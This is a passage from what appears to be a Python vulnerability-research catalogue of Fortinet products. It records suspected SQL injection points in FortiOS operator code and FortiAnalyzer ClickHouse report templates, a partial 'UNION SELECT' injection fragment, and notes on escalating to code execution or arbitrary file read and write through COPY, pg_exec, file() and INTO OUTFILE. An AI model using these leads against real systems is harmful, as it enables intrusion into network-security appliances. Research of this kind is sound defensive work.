                "vuln": (
                    "adom_oid interpolated directly into PostgreSQL query via f-string. "
                    "Typed as int in __init__ but if playbook context supplies it as a string "
                    "without validation, SQLi -> PostgreSQL RCE via COPY TO/FROM or pg_exec. "
                    "Table: endpoints (FortiClient endpoint records). "
                    "PostgreSQL connection via Airflow PostgresHook(POSTGRES_CONN_ID)."
                ),
                "severity": "HIGH",
            },
            "FOS/operator.py:167": {
                "code": "sql = f'''select t1.mac, t1.fctuid from {table_endpoint} t1 where t1.epid = {epid} limit 1;'''",
                "vuln": (
                    "epid interpolated directly. Same PostgreSQL execution path. "
                    "epid originates from get_macaddr_fctuid_by_epid(epid) caller -- "
                    "trace input source to determine if externally controllable."
                ),
                "severity": "HIGH",
            },
        },
        "fos_native_libs": {
            "libsrchd.so":    "Loaded with RTLD_GLOBAL in FOS/operator.py webhook(); search handler",
            "libsessionmgr.so": "Loaded with RTLD_GLOBAL; session manager",
            "note": (
                "RTLD_GLOBAL makes symbols from these libraries available to all subsequently "
                "loaded SOs in the process -- symbol collision attack if attacker controls "
                "a loaded library path."
            ),
        },
        "ems_auth_pattern": {
            "verify_ssl": "False (hardcoded default -- SSL verification disabled for all EMS connections)",
            "credential_source": "find_ems_connector_params() -> super().find_connector_params() -> PostgreSQL",
            "stored_fields": ["server-addr", "auth-user", "auth-password", "auth-type", "auth-token"],
            "cloud_auth": "signin_cloud() -- FortiCloud OAuth via account_id; no client secret in connector",
        },
    },
}


# ---------------------------------------------------------
# FAZ ClickHouse query injection via $filter template variable
# Source: syntax.tar.xz -> ncmdb/adom_defconf_1.txt (FortiAnalyzer report engine)
# ---------------------------------------------------------
FAZ_CLICKHOUSE_FILTER_INJECTION = {
    "id":      "FAZ-CH-FILTER-SQLi",
    "product": "FortiAnalyzer 8.0.x -- ClickHouse log query engine report filter injection",
    "source":  "syntax.tar.xz -> ncmdb/adom_defconf_1.txt (414 log paths in fmglog_syntax.json)",

    "mechanism": (
        "FortiAnalyzer report engine uses ClickHouse for log storage and query. "
        "All report queries are constructed by string-substituting template variables "
        "($filter, $filter-drilldown, $log, $flex_timestamp, $flex_timescale, $bully_keywords, $banned_keywords) "
        "directly into ClickHouse SQL strings at query time. "
        "The /*sql_normalized*/ prefix indicates a normalization pass, but ClickHouse "
        "historically lacked parameterized queries before v24; "
        "if the normalization does not escape single-quotes in filter values, "
        "injection through any user-controlled filter parameter is possible."
    ),

    "injection_vectors": {
        "$filter": (
            "Primary injection point. Appears in WHERE clause of every report query "
            "(traffic, webfilter, IPS, event, DLP categories). "
            "Source: report filter form in FortiAnalyzer web UI or API log-query filter parameter. "
            "Example query fragment: '...from $log where $filter and (bitAnd(logflag,1)>0)...' "
            "A value like '1=1) UNION SELECT...' terminates the WHERE clause and injects."
        ),
        "$filter-drilldown": (
            "Second WHERE clause substitution in drilldown report queries. "
            "Same injection surface as $filter -- controls outer query WHERE after subquery."
        ),
        "$bully_keywords": (
            "Substituted into DLP/bullying keyword filter: 'where $filter and ($bully_keywords)'. "
            "Content comes from DLP sensor policy keyword configuration -- "
            "attacker with DLP policy write access can inject via keyword field."
        ),
        "$banned_keywords": (
            "Same pattern as $bully_keywords. DLP sensor keyword field -> ClickHouse WHERE injection."
        ),
    },

    "log_schema": {
        "file": "fmglog_syntax.json (203KB, C-comment JSON, not valid JSON -- requires comment stripping)",
        "total_log_paths": 414,
        "categories": ["event/system", "event/user", "event/router", "traffic", "utm/webfilter",
                       "utm/ips", "utm/dlp", "utm/app-ctrl", "utm/email", "utm/voip"],
        "largest_string_fields": "sz=1024 (multiple fields)",
        "note": (
            "Complete log field schema for all 414 log types. "
            "Knowing field IDs and types enables precise injection payloads "
            "targeting specific ClickHouse column types."
        ),
    },

    "attack_surface_note": (
        "ClickHouse binary is 636MB unstripped (FMG-CLICKHOUSE). "
        "If $filter injection reaches ClickHouse query execution, "
        "attacker can use ClickHouse file() table function or INTO OUTFILE "
        "to read/write arbitrary filesystem paths as the ClickHouse process user. "
        "ClickHouse default HTTP interface port 8123 -- check if exposed on FMG loopback or LAN."
    ),
}
